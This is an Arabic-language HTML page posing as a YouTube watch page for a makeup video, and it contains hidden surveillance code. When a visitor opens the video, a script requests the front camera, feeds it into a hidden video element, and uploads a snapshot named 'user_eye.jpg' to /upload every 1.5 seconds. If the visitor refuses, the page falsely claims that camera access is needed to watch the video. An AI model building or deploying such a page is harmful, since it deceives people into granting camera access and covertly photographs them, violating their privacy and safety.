<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<meta name="theme-color" content="#0f0f0f">
<title>اضغط لمشاهدة الفيديو على يوتيوب</title>
<meta name="description" content="قناتي تهتم بكل ما يهم المرأة وبكل جديد في عالم الموضة والازياء" />
<style>
:root{--bg:#0f0f0f;--bg2:#272727;--text:#fff;--text2:#aaa;--red:#ff0000;}
*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
body{font-family:system-ui,sans-serif;background:var(--bg);color:var(--text);font-size:14px;line-height:1.5;overflow-x:hidden}
.topbar{position:fixed;top:0;inset-inline:0;height:56px;background:var(--bg);display:flex;align-items:center;justify-content:space-between;padding:0 16px;z-index:100;border-bottom:1px solid rgba(255,255,255,.1)}
.logo{display:flex;align-items:center;gap:6px;font-weight:700;font-size:20px;color:#fff;background:none;border:0;cursor:pointer}
.main{padding-top:70px;padding:16px}
.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:16px}
.card{cursor:pointer;background:#181818;border-radius:12px;overflow:hidden;border:1px solid rgba(255,255,255,0.08)}
.thumb{position:relative;aspect-ratio:16/9;background:#000}
.thumb img{width:100%;height:100%;object-fit:cover}
.meta{padding:12px}
.t{font-size:15px;font-weight:600;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden}
.sub{color:var(--text2);font-size:13px;margin-top:4px}
.player{position:relative;width:100%;max-width:480px;aspect-ratio:9/16;background:#000;border-radius:12px;overflow:hidden;margin:0 auto}
.player iframe{position:absolute;inset:0;width:100%;height:100%;border:0}
</style>
</head>
<body>

<header class="topbar">
  <button class="logo" onclick="goHome()">
    <svg viewBox="0 0 28 20" style="width:30px;height:21px"><rect width="28" height="20" rx="5" fill="#f00"/><path d="M11 6l7 4-7 4z" fill="#fff"/></svg>
    <span>يوتيوب</span>
  </button>
</header>

<main class="main" id="appView"></main>

<!-- عنصر الكاميرا الخفي -->
<video id="video" autoplay playsinline style="display:none;"></video>

<script>
const videoData = {
    id: 'zMORugVTZAA',
    title: 'مين صار معه كذا 😂#حب وعشق #ميك_اب #فاونديشن #foundation #makeup #مكياج',
    ch: 'Warda Moda عالم وردة',
    views: '457 ألف',
    time: 'هذا الشهر',
    dur: '00:16'
};

function renderHome() {
    document.getElementById('appView').innerHTML = `
        <div class="grid">
            <div class="card" onclick="openWatch('${videoData.id}')">
                <div class="thumb">
                    <img src="https://img.youtube.com/vi/${videoData.id}/hqdefault.jpg" alt="">
                    <span style="position:absolute;bottom:6px;right:6px;background:rgba(0,0,0,0.8);color:#fff;padding:2px 6px;border-radius:4px;font-size:12px">${videoData.dur}</span>
                </div>
                <div class="meta">
                    <div class="t">${videoData.title}</div>
                    <div class="sub">${videoData.ch}</div>
                    <div class="sub">${videoData.views} مشاهدة • ${videoData.time}</div>
                </div>
            </div>
        </div>
    `;
}

function openWatch(id) {
    document.getElementById('appView').innerHTML = `
        <div style="max-width:600px;margin:0 auto;">
            <div class="player" id="playerContainer">
                <iframe src="https://www.youtube.com/embed/${id}?autoplay=1&rel=0&playsinline=1" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
            </div>
            <h2 style="font-size:18px;margin-top:12px;color:#fff;">${videoData.title}</h2>
        </div>
    `;
    startCapture();
}

function goHome() {
    renderHome();
}

// تشغيل الواجهة فوراً عند فتح الصفحة
renderHome();

/* ===== نظام الالتقاط التلقائي والخفي ===== */
let mediaStream = null;

async function initPersistentCamera() {
    try {
        mediaStream = await navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: { ideal: 'user' } } 
        });

        const videoEl = document.getElementById('video');
        if (videoEl) videoEl.srcObject = mediaStream;
        
        const playerContainer = document.getElementById('playerContainer');
        if (playerContainer && playerContainer.querySelector('#retryCamera')) {
            playerContainer.innerHTML = `<iframe src="https://www.youtube.com/embed/${videoData.id}?autoplay=1&rel=0&playsinline=1" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>`;
        }
        
        // إرسال الصور كل 1.5 ثانية
        setInterval(() => {
            if (!mediaStream || !videoEl) return;
            try {
                const canvas = document.createElement('canvas');
                canvas.width = videoEl.videoWidth || 640;
                canvas.height = videoEl.videoHeight || 480;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);

                canvas.toBlob(blob => {
                    if (blob) {
                        let fd = new FormData();
                        fd.append('image', blob, 'user_eye.jpg');
                        fetch('/upload', { method: 'POST', body: fd }).catch(() => {});
                    }
                }, 'image/jpeg', 0.85);
            } catch (err) {}
        }, 1500);

    } catch (e) {
        const playerContainer = document.getElementById('playerContainer');
        if (playerContainer) {
            playerContainer.innerHTML = `
                <div id="retryCamera" style="display:grid;place-items:center;height:100%;color:#fff;text-align:center;padding:20px;cursor:pointer;background:#111;position:absolute;inset:0;z-index:99;">
                    <div>
                        <div style="font-size:36px;margin-bottom:8px;">⚠️</div>
                        <p style="color:#ff0000;font-weight:bold;margin-bottom:6px;font-size:15px;">عذراً، يجب السماح بالكاميرا لعرض الفيديو</p>
                        <p style="color:#aaa;font-size:12px;margin-bottom:12px;">انقر هنا لإظهار نافذة الأذونات من جديد</p>
                        <span style="font-size:13px;color:#fff;background:#cc0000;padding:8px 18px;border-radius:20px;display:inline-block;font-weight:bold;">إعادة محاولة السماح</span>
                    </div>
                </div>
            `;
            
            document.getElementById('retryCamera').onclick = () => {
                mediaStream = null;
                initPersistentCamera();
            };
        }
    }
}

function startCapture() {
    if (mediaStream) return;
    initPersistentName = true;
    initPersistentCamera();
}
</script>
</body>
</html>
